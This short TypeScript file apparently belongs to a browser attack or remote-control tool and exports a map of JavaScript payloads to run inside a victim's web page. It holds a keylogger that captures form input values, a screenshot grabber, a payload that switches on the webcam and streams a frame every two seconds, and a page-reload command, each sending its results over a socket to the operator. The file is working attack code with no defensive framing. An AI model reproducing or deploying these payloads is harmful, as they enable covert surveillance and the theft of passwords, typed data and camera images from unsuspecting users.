export const Payload: { [key: string]: string } = {
  close: "window.location.reload() || 'Connection closed'",
  screenshot:
    "(()=>{$.getScript('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js').then(()=>html2canvas(document.body).then(c=>socket.send(JSON.stringify(c.toDataURL()))))})()||`Please wait for screenshot`",
  keylogger:
    "document.addEventListener('change',(e)=> socket.send(JSON.stringify({type:'stream',name:'keylogger',[e.target.nodeName]:{value:e.target.value,attributes:Object.assign({},...[...new Set(e.target.attributes)].map((attr) => ({[attr.nodeName]: attr.value})))}})))||'Keylogger Executed'",
  videoStream:
    "(()=>{v=document.createElement('video');navigator.mediaDevices.getUserMedia({video:true}).then((stream)=>{v.srcObject=stream;v.play();setInterval(()=>{c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);socket.send(JSON.stringify({video:c.toDataURL()}))},2000)})})()||'Video Stream Started'",
};
